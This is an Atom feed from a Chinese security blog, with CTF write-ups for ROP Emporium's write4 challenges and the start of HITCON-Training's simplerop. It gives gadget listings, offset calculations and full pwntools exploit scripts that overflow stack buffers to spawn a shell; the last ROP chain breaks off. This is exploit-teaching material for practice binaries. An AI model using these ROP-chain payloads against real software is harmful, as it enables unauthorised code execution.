<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iosmosis&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://iosmosis.github.io/"/>
  <updated>2018-07-12T17:08:56.803Z</updated>
  <id>http://iosmosis.github.io/</id>
  
  <author>
    <name>iosmosis</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ROPEmporium-WriteUp</title>
    <link href="http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/"/>
    <id>http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/</id>
    <published>2018-07-12T09:35:36.000Z</published>
    <updated>2018-07-12T17:08:56.803Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看堆系列 最近的wp都是大家有疑惑 我自己也有点不明白的题目 所以再次记录</p>
<h2 id="write432"><a href="#write432" class="headerlink" title="write432"></a>write432</h2><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec write432
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/write432'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>NX 开启</p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"write4 by ROP Emporium"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"32bits\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExiting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看到main函数中调用了一个pwnme() 猜测漏洞应该在此</p>
<p>跟进查看pwnme</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>

  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Go ahead and give me the string already!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
<span class="token punctuation">}</span>
</code></pre>
<p>程序没有提供shell 但是调用了system</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">usefulFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里调用/bin/ls  但是我们想要的是/bin/sh  所以我们要利用rop想办法构造/bin/sh 并参给system</p>
<p>尝试使用ROPgadget搜索</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write432 --only <span class="token string">"pop|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x080486db <span class="token keyword">:</span> pop ebp <span class="token punctuation">;</span> ret
0x080486d8 <span class="token keyword">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x080483e1 <span class="token keyword">:</span> pop ebx <span class="token punctuation">;</span> ret
0x080486da <span class="token keyword">:</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x080486d9 <span class="token keyword">:</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x0804819d <span class="token keyword">:</span> ret
0x080484fe <span class="token keyword">:</span> ret 0xeac1

Unique gadgets found: 7
</code></pre>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write432 --only <span class="token string">"mov|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x08048547 <span class="token keyword">:</span> mov al, byte ptr <span class="token punctuation">[</span>0xc9010804<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret
0x08048670 <span class="token keyword">:</span> mov dword ptr <span class="token punctuation">[</span>edi<span class="token punctuation">]</span>, ebp <span class="token punctuation">;</span> ret
0x080484b0 <span class="token keyword">:</span> mov ebx, dword ptr <span class="token punctuation">[</span>esp<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret
0x0804819d <span class="token keyword">:</span> ret
0x080484fe <span class="token keyword">:</span> ret 0xeac1

Unique gadgets found: 5
ubuntu@ubuntu:~$ 
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<h4 id="ROP构造思路"><a href="#ROP构造思路" class="headerlink" title="ROP构造思路"></a>ROP构造思路</h4><p>先计算偏移 </p>
<pre class=" language-python"><code class="language-python">gef➤  p<span class="token operator">/</span>d <span class="token number">0x28</span><span class="token operator">+</span><span class="token number">4</span>
$<span class="token number">5</span> <span class="token operator">=</span> <span class="token number">44</span>
</code></pre>
<p>得到偏移为44</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">pop_edi_ebp<span class="token operator">=</span><span class="token number">0x080486da</span> <span class="token comment" spellcheck="true"># pop edi ; pop ebp ; ret</span>
mov_ret<span class="token operator">=</span><span class="token number">0x08048670</span> <span class="token comment" spellcheck="true"># mov dword ptr [edi], ebp ; ret</span>
system_plt<span class="token operator">=</span><span class="token number">0x8048430</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>
<span class="token comment" spellcheck="true">#因为32位寄存器最多只能写4字节，而/bin/sh为7字节 所以我们分两次写入</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#覆盖偏移到ret + 覆盖ret为pop_edi_ebp+将bss地址写入edi+将/bin写入ebp+将ebp的内容写入bss段</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#覆盖ret到pop_edi_ebp+将bss+4的地址写入edi(因为bss段前4个地址写入了/bin所以这里为了拼接从bss+4的位置开始写入)+将/sh写入ebp+将ebp的内容写入bss段</span>
payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#覆盖返回地址为system地址+写如system返回地址 可以任意写 +system调用参数的地址 此处存放地址为bss</span>
</code></pre>
<h3 id="所以可以得到exp"><a href="#所以可以得到exp" class="headerlink" title="所以可以得到exp"></a>所以可以得到exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'write432'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'write432'</span><span class="token punctuation">)</span>

bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
pop_edi_ebp<span class="token operator">=</span><span class="token number">0x080486da</span>
mov_ret<span class="token operator">=</span><span class="token number">0x08048670</span>
system_plt<span class="token operator">=</span><span class="token number">0x8048430</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/12/ROPEmporium-WriteUp/1.jpg" alt="1"></p>
<h2 id="write464"><a href="#write464" class="headerlink" title="write464"></a>write464</h2><p>题目基本流程和上一道类似</p>
<p>所以这里直接从ROP构造开始讲解</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">gef➤  p<span class="token operator">/</span>d <span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span>
$<span class="token number">2</span> <span class="token operator">=</span> <span class="token number">40</span>
</code></pre>
<p>所以得到偏移为40</p>
<p>尝试用ROPgadget搜索可用的gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write4 --only <span class="token string">"pop|mov|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x0000000000400713 <span class="token keyword">:</span> mov byte ptr <span class="token punctuation">[</span>rip + 0x20096e<span class="token punctuation">]</span>, 1 <span class="token punctuation">;</span> ret
0x0000000000400821 <span class="token keyword">:</span> mov dword ptr <span class="token punctuation">[</span>rsi<span class="token punctuation">]</span>, edi <span class="token punctuation">;</span> ret
0x00000000004007ae <span class="token keyword">:</span> mov eax, 0 <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400820 <span class="token keyword">:</span> mov qword ptr <span class="token punctuation">[</span>r14<span class="token punctuation">]</span>, r15 <span class="token punctuation">;</span> ret
0x000000000040088c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040088e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400890 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400892 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400712 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> mov byte ptr <span class="token punctuation">[</span>rip + 0x20096e<span class="token punctuation">]</span>, 1 <span class="token punctuation">;</span> ret
0x000000000040088b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040088f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004006b0 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400893 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
0x0000000000400891 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040088d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004005b9 <span class="token keyword">:</span> ret

Unique gadgets found: 16
</code></pre>
<p>接下来进行构造</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">pop_r14_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400890</span> <span class="token comment" spellcheck="true"># pop r14 ; pop r15 ; ret</span>
mov_ret <span class="token operator">=</span> <span class="token number">0x0000000000400820</span> <span class="token comment" spellcheck="true"># mov qword ptr [r14], r15 ; ret</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400893</span> <span class="token comment" spellcheck="true"># pop rdi ; ret</span>
system_plt <span class="token operator">=</span><span class="token number">0x00000000004005E0</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>
<span class="token comment" spellcheck="true">#因为64位下可写入8字节而/bin/sh为7字节所以可以一次写入</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#覆盖偏移到ret+覆盖ret为pop_r14_r15+将bss地址写入r14+将/bin/sh\x00写入r15+将r15内容写到r14(bss)处</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#由于64位所以binsh地址参数需要放在rdi寄存器中，覆盖ret为pop_rdi+将bss地址写入rdi+写入system并调用rdi参数</span>
</code></pre>
<h3 id="所以可以构造exp"><a href="#所以可以构造exp" class="headerlink" title="所以可以构造exp"></a>所以可以构造exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'write4'</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'write4'</span><span class="token punctuation">)</span>
pop_r14_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400890</span>
mov_ret <span class="token operator">=</span> <span class="token number">0x0000000000400820</span> 
system_plt <span class="token operator">=</span><span class="token number">0x00000000004005E0</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400893</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/12/ROPEmporium-WriteUp/2.jpg" alt="2"></p>
<p>成功获得shell</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看堆系列 最近的wp都是大家有疑惑 我自己也有点不明白的题目 所以再次记录&lt;/p&gt;
&lt;h2 id=&quot;write432&quot;&gt;&lt;a href=&quot;#write432&quot; class=&quot;headerlink&quot; title=&quot;write432&quot;&gt;&lt;/a&gt;write432&lt;/h2&gt;&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HITCON-Training-Writeup</title>
    <link href="http://iosmosis.github.io/2018/07/12/HITCON-Training-Writeup/"/>
    <id>http://iosmosis.github.io/2018/07/12/HITCON-Training-Writeup/</id>
    <published>2018-07-11T17:09:38.000Z</published>
    <updated>2018-07-12T11:19:06.422Z</updated>
    
    <content type="html"><![CDATA[<p>记录HITCON题目中遇到的问题</p>
<h2 id="simplerop"><a href="#simplerop" class="headerlink" title="simplerop"></a>simplerop</h2><h4 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec simplerop
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/simplerop'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>开启NX</p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token operator">!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span>C<span class="token punctuation">:</span>\Users\TTTR\ios\source\_posts\HITCON<span class="token operator">-</span>Training<span class="token operator">-</span>Writeup\<span class="token number">1</span><span class="token punctuation">.</span>jpg<span class="token punctuation">)</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-14h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ROP is easy is'nt it ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your input :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞很明显存在于read函数 这里限制的读入v4的长度为100</p>
<p>因为此题目属于静态链接libc 理论上可以直接使用ROPgadget生成ropchain进而getshell</p>
<p>先来计算偏移 </p>
<p>gdb在call read处下断</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">b* 0x8048E69
</code></pre>
<p>运行后查看当前esp ebp</p>
<p><img src="/2018/07/12/HITCON-Training-Writeup/1.jpg" alt="1"></p>
<p>计算当前v4的地址</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gef➤  p/x 0xffffd040+0x1c
<span class="token variable">$1</span> <span class="token operator">=</span> 0xffffd05c
</code></pre>
<p>计算v4距离ebp的偏移</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gef➤  p/d 0xffffd078-0xffffd05c
<span class="token variable">$2</span> <span class="token operator">=</span> 28
</code></pre>
<p>所以偏移就该为 28+4=32</p>
<p>那么正常情况下我们就用ROPgadget生成ropchain</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ROPgadget --binary simplerop --ropchain
</code></pre>
<p>得到exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'simplerop'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># Padding goes here</span>
p <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bae06</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
